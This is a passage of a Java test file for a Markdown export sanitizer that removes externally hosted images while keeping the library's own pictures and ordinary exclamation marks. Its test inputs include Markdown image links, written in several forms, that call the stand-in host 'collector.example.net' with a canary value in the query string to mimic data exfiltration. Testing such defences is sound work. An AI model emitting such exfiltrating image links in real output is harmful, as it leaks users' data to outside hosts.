     * A picture's words may be long (a caption of two thousand characters), and a mark may stand on a long line with no bracket
     * after it: the file is written all the same (until the second reading of 0.8.1 the pattern that read a picture's words went one
     * level deeper for each character, and some 1,800 of them used the thread's stack up: no file was written). And the pictures
     * found by hand are the ones the pattern found: every text of up to seven pieces over the pieces that matter, and fifty thousand
     * longer ones drawn by a fixed seed.
     */
    @Test
    void aPicturesLongWordsAreReadAndTheScanFindsWhatThePatternFound() {
        String caption = "The ferry at the pier in 1952, seen from the harbour office, " + "with the crew on deck and the mail van on the ramp, ".repeat(60);
        assertTrue(caption.length() > 3000);
        String long1 = "In 1952.\n\n![" + caption + "](/images/kept.png)\n", long2 = "What a crossing![" + "and the story goes on and on ".repeat(8000) + "\n\nThe end.\n", long3 = "![" + "[a] ".repeat(30_000) + "](/images/kept.png) and ![x](https://collector.example.net/p.png?d=" + CANARY + ")";
        Map<String, String> wrote = new LinkedHashMap<>();
        for (Map.Entry<String, String> e : Map.of("a caption of " + caption.length() + " characters", long1, "a mark on a line of " + long2.length() + " characters with no bracket after it", long2, "words made of thirty thousand bracketed pieces", long3).entrySet()) {
            try { String out = Export.forAViewer(e.getValue()); wrote.put(e.getKey(), "written" + (GuardChecksPagesTest.drawnByCommonMark(out).stream().anyMatch(d -> d.contains(CANARY)) ? ", A PICTURE OF THE WEB DRAWN" : "")); }
            catch (RuntimeException | Error x) { wrote.put(e.getKey(), "FAILED " + x); }
        }
        assertTrue(Export.forAViewer(long1).contains("![" + caption + "](/images/kept.png)"), "the library's own picture with a long caption stays a picture");
        // the scan, against the pattern
        String[] pieces = {"![", "]", "(", ")", "/images/k.png", "/images/../x", "/x", " \"t\"", " ", "a", "[", "!", "<", "\n", "https://e.example/p.png", "'t'", "\\"};
        List<String> differ = new ArrayList<>();
        long tried = 0, found = 0;
        for (int length = 0; length <= 5; length++) {
            int[] at = new int[length];
            for (boolean more = true; more; ) {
                StringBuilder b = new StringBuilder();
                for (int i : at) b.append(pieces[i]);
                tried++; found += sameScan(b.toString(), differ);
                more = false;
                for (int i = length - 1; i >= 0; i--) { if (++at[i] < pieces.length) { more = true; break; } at[i] = 0; }
            }
        }
        Random r = new Random(20261121);
        String[] words = {"a", "The ferry", "[b]", "!", "[", "]", "<", "\n", "![", " ", "[b[c]]", "x![y", ""}, closes = {"]", "]", "]", "] ", ""}, opens = {"(", "(", "( ", "(\t", "[", ""};
        String[] paths = {"/images/k.png", "/images/k.png", "/images/collections/J-1/s.jpg", "/images/../x", "/x", "//h/x", "/images/k.png<i>", "https://e.example/p.png", "/images/a b.png", "/images/k.png\\", ""}, titles = {"", "", " \"t\"", " 't'", " \"t<\"", " t", " \"a [b]\"", "\t'it is'"}, ends = {")", ")", " )", "", "]"};
        for (int k = 0; k < 300_000; k++) {
            StringBuilder b = new StringBuilder(r.nextInt(3) == 0 ? "See " : "");
            for (int pictures = 1 + r.nextInt(3); pictures > 0; pictures--) {   // the shape of a picture, right and nearly right, one after or inside another
                b.append("![");
                for (int i = r.nextInt(4); i > 0; i--) b.append(words[r.nextInt(r.nextInt(3) == 0 ? words.length : 3)]);
                if (r.nextInt(6) == 0) continue;   // the next one begins inside this one's words
                b.append(closes[r.nextInt(closes.length)]).append(opens[r.nextInt(opens.length)]).append(paths[r.nextInt(paths.length)]).append(titles[r.nextInt(titles.length)]).append(ends[r.nextInt(ends.length)]);
                if (r.nextInt(3) == 0) b.append(pieces[r.nextInt(pieces.length)]);
            }
            tried++; found += sameScan(b.toString(), differ);
        }
        System.out.println("[review] an exported file whose picture has long words: " + wrote + "; the library's own pictures found by hand and by the pattern as it was: " + tried + " texts, " + found + " pictures found by the pattern, differences " + differ.size() + " " + differ.stream().limit(5).toList());
        for (Map.Entry<String, String> e : wrote.entrySet()) assertEquals("written", e.getValue(), e.getKey());
        assertTrue(tried > 1_500_000 && found > 20_000, "the texts were tried and hold pictures (the control): " + tried + " / " + found);
        assertEquals(List.of(), differ.stream().limit(20).toList());
    }

    /** Whether the scan finds in {@code text} the pictures the pattern finds, each kept or not by the same rule; how many the pattern found. */
    private static int sameScan(String text, List<String> differ) {
        List<String> byPattern = new ArrayList<>(), byHand = new ArrayList<>();
        Matcher m = OWN_PICTURE_AS_IT_WAS.matcher(text);
        int all = 0;
        while (m.find()) { all++; String path = m.group(1); if (Pages.keptPicturePath(path) && path.indexOf('<') < 0 && path.indexOf('>') < 0 && path.indexOf('"') < 0 && path.indexOf('\'') < 0 && path.indexOf('`') < 0) byPattern.add(m.start() + "-" + m.end()); }
        for (int[] own : Export.ownPictures(text)) byHand.add(own[0] + "-" + own[1]);
        if (!byPattern.equals(byHand) && differ.size() < 50) differ.add("\"" + text.replace("\n", "\\n") + "\": the pattern " + byPattern + ", by hand " + byHand);
        return all;
    }

    /**
     * An exclamation mark before a bracket that begins no picture is the writer's own, and stays: "Wow![1]" with a numbered
     * reference, a note in brackets after a sentence that ends with one. A mark that does begin a picture goes, however the picture
     * is written (an address, a reference, a reference by its own words). The file is read as the specification reads it.
     */
    @Test
    void anExclamationMarkThatBeginsNoPictureStays() {
        String evil = "https://collector.example.net";
        Map<String, String> prose = new LinkedHashMap<>();
        prose.put("a numbered reference after an exclamation", "What a crossing![1] The ferry ran until 1968.[2]\n");
        prose.put("a note in brackets", "It sank twice![sic] And was raised.\n");
        prose.put("an unclosed bracket", "Nobody knows why![the log is lost\n");
        prose.put("brackets with nothing after", "Look![here] and then go on.\n");
        Map<String, String> changed = new LinkedHashMap<>();
        for (Map.Entry<String, String> e : prose.entrySet()) { String out = Export.forAViewer(e.getValue()); if (!out.equals(e.getValue())) changed.put(e.getKey(), out.strip()); }
        Map<String, String> pictures = new LinkedHashMap<>();
        pictures.put("with its address", "See ![s](" + evil + "/a.png?d=" + CANARY + ") here.\n");
        pictures.put("by a reference", "See ![s][ref] here.\n\n[ref]: " + evil + "/b.png?d=" + CANARY + "\n");
        pictures.put("by a reference of no words", "See ![ref][] here.\n\n[ref]: " + evil + "/c.png?d=" + CANARY + "\n");
        pictures.put("by its own words as the reference", "See ![ref] here.\n\n[ref]: " + evil + "/d.png?d=" + CANARY + "\n");
        pictures.put("by its own words, the definition far below", "See ![the log] here.\n\nMore words.\n\n## Sources\n\n[The Log]: " + evil + "/e.png?d=" + CANARY + "\n");
        pictures.put("two marks", "See !![s](" + evil + "/f.png?d=" + CANARY + ") here.\n");
        pictures.put("a space before the address", "See ![s]( " + evil + "/g.png?d=" + CANARY + " ) here.\n");
        Map<String, List<String>> drawn = new LinkedHashMap<>();
        for (Map.Entry<String, String> e : pictures.entrySet()) {
            assertTrue(GuardChecksPagesTest.drawnByCommonMark(e.getValue()).stream().anyMatch(x -> x.contains(CANARY)), "as written, a reader by the specification draws it (the control): " + e.getKey());
            List<String> after = GuardChecksPagesTest.drawnByCommonMark(Export.forAViewer(e.getValue())).stream().filter(x -> x.contains(CANARY)).toList();
            if (!after.isEmpty()) drawn.put(e.getKey(), after);
        }
        System.out.println("[review] B-100 an exclamation mark before a bracket that begins no picture, " + prose.size() + " ways: changed in " + changed.size() + " " + changed + "; a picture written " + pictures.size() + " ways: still drawn in " + drawn.size() + " " + drawn.keySet());
        assertEquals(Map.of(), drawn, "a picture of the web is drawn from the exported file");
        assertEquals(Map.of(), changed, "the writer's own exclamation mark was taken out");
    }
}
